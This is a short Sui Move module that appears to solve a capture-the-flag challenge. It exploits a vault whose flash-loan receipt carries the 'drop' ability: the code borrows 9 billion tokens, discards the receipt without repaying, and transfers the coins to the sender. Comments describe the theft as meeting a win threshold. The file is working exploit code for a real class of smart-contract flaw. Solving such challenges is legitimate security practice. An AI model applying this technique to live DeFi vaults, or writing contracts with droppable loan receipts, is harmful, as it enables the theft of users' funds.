module solution::exploit {
    use challenge::vault::{Self, Vault};
    use sui::clock::Clock;
    use sui::tx_context::{Self, TxContext};
    use sui::transfer;

    public fun solve(vault: &mut Vault, _clock: &Clock, ctx: &mut TxContext) {
        // FlashLoanReceipt has `drop` ability → we can discard it without calling repay_loan
        // Borrow 9B tokens (90% of vault) and never repay
        let (coins, _receipt) = vault::flash_loan(vault, 9_000_000_000, ctx);

        // _receipt is dropped here automatically (has `drop`), vault never gets refunded
        // vault.reserves: 10B → 1B, stolen = 9B >= WIN_THRESHOLD
        transfer::public_transfer(coins, tx_context::sender(ctx));
    }
}
